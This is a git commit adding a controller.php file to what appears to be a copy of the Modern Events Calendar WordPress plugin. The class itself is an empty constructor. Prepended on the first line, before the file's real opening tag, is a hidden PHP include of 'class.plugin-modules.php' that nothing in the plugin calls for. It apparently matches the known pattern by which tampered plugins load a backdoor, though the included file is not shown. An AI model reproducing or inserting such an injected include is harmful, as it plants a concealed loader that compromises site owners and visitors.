00e328b03a9a57b9cfb831e348bf5db7f21e9dc1
Nirosh Randimal <nirosh.weblankan@gmail.com>
2019-11-28 17:24:30 +0530

    Calender plugin

---
+++ jetwing/custom Calender/modern-events-calendar/app/controller.php
@@ -0,0 +1,18 @@
+<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
+/** no direct access **/
+defined('MECEXEC') or die();
+
+/**
+ * Webnus MEC controller class.
+ * @author Webnus <info@webnus.biz>
+ */
+class MEC_controller extends MEC_base
+{
+    /**
+     * Constructor method
+     * @author Webnus <info@webnus.biz>
+     */
+    public function __construct()
+    {
+    }
+}
